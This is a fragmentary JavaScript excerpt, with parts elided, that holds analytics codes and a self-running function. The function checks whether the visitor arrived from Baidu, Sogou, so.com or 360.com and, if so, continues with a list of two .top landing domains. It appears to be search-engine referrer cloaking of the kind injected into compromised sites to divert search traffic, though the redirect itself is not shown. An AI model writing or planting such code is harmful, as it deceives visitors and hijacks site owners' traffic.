...
function add_tj(){
    var code_bd = "36f6a440d903d4bd34ff1aca2c806985";
    var code_51 = "KPHqdfLZ8bT6UqjD";
...
(function (){
    ...
    let from_engin = document.referrer.match(/(baidu\.com|sogou\.com|so\.com|360\.com)/i);
    if (!from_engin){
        return;
    }
    let ldys = ["www.daveil.top","www.daveiq.top"];
